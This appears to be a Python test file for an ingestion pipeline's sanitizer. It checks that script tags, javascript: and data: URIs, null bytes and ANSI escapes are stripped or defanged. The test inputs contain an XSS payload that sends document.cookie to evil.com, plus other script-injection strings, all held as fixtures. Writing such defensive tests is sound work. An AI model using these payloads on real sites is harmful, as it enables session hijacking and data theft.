"""Tests for untrusted input sanitization and ingestion pipeline."""

import pytest
from app.ingestion.sanitizer import InputSanitizer
from app.ingestion.pipeline import IngestionPipeline
from app.ingestion.schemas import RawIngestEnvelope


def test_sanitizer_neutralizes_script_tags():
    """Verify script tags are completely redacted."""
    raw = "Breaking leak: <script>document.location='http://evil.com/steal?c='+document.cookie</script> Check this out."
    sanitized, actions = InputSanitizer.sanitize_text(raw)
    assert "<script>" not in sanitized
    assert "[REDACTED_SCRIPT_BLOCK]" in sanitized
    assert "redacted_script_block" in actions


def test_sanitizer_strips_null_bytes_and_control_chars():
    """Verify null bytes and terminal control characters are stripped."""
    raw = "Malicious\x00payload\x08with\x1b[31mANSI color code\x1b[0m"
    sanitized, actions = InputSanitizer.sanitize_text(raw)
    assert "\x00" not in sanitized
    assert "\x08" not in sanitized
    assert "\x1b[31m" not in sanitized
    assert "stripped_control_and_null_bytes" in actions
    assert "stripped_ansi_escapes" in actions


def test_sanitizer_defangs_dangerous_schemes():
    """Verify javascript: and data: schemes are defanged."""
    raw = "Click here: <a href='javascript:evil()'>Download leak</a> or data:text/html;base64,PHNjcmlwdD4="
    sanitized, actions = InputSanitizer.sanitize_text(raw)
    assert "javascript:" not in sanitized
    assert "data:" not in sanitized
    assert "defanged_malicious_uri_scheme" in actions


def test_ingestion_pipeline_computes_sha256_and_sanitizes(test_tenant_id: str):
    """Verify ingestion pipeline processes raw envelope, generates SHA-256, and sanitizes text."""
    envelope = RawIngestEnvelope(
        tenant_id=test_tenant_id,
        source_type="telegram",
        source_reference="@cyberthreats",
        raw_payload={
            "message_id": 404,
            "channel_title": "Threat Hub <script>alert(1)</script>",
            "sender_username": "actor_x",
            "raw_text": "Sensitive dump leaked:\x00 https://archive.local/leak.tar.gz",
        },
    )

    item = IngestionPipeline.process_envelope(envelope)
    assert item.tenant_id == test_tenant_id
    assert item.source_type == "telegram"
    assert item.external_id == "404"
    assert len(item.content_sha256) == 64  # Valid 64-char hex SHA-256
    assert "\x00" not in item.sanitized_text
    assert "<script>" not in item.title
